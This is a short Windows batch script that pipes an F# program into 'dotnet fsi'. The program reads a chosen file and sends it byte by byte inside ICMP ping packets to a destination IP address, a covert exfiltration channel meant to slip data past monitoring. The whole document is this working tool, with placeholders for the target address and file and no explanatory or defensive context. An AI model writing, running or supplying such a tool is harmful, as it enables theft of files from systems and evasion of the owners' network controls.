@echo off
(
echo open System
echo open System.IO
echo open System.Net.NetworkInformation
echo open System.Text
echo open System.Threading
echo let destination = fsi.CommandLineArgs.[1]
echo let filename = fsi.CommandLineArgs.[2]
echo let isTextFile (filename: string) =
echo     try
echo         let text = File.ReadAllText(filename)
echo         true
echo     with
echo     | :? IOException -> false
echo let buffer =
echo     if isTextFile filename then
echo         let text = File.ReadAllText(filename)
echo         Encoding.ASCII.GetBytes(text)
echo     else
echo         File.ReadAllBytes(filename)
echo let pingSender = new Ping()
echo for i in 0 .. buffer.Length - 1 do
echo     let payload = [| buffer.[i] |]
echo     let reply = pingSender.Send(destination, 1000, payload)
echo     printfn "%%A" reply.Status
echo     Thread.Sleep(1000)
) | dotnet fsi -- <DESTINATIONIPADDRESS> <FILENAME>
